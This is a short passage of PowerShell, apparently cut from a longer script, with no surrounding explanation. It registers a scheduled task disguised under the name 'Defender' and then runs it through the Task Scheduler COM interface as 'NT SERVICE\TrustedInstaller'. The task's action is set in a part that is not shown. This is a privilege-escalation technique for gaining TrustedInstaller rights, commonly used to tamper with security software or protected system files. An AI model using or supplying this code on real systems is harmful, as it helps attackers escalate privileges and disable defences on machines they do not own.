...
Register-ScheduledTask -TaskName 'Defender' -Action $a;$svc = New-Object -ComObject 'Schedule.Service';$svc.Connect();$user = 'NT SERVICE\TrustedInstaller'
$folder = $svc.GetFolder('\');$task = $folder.GetTask('Defender');$task.RunEx($null, 0, 0, $user)
